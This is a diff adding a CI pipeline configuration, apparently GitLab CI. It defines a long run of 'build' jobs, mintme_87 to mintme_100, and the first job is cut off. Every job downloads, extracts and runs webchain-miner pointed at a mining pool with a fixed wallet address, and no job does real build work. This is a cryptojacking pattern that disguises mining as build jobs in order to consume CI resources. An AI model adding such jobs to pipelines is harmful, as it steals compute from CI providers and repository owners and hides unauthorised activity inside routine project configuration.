+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+       mintme_87:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    
+      mintme_89:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_90:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    mintme_91:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    
+    mintme_92:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    mintme_93:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_94:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+      mintme_95:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_96:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+ 
+     mintme_97:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_98:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_99:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_100:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
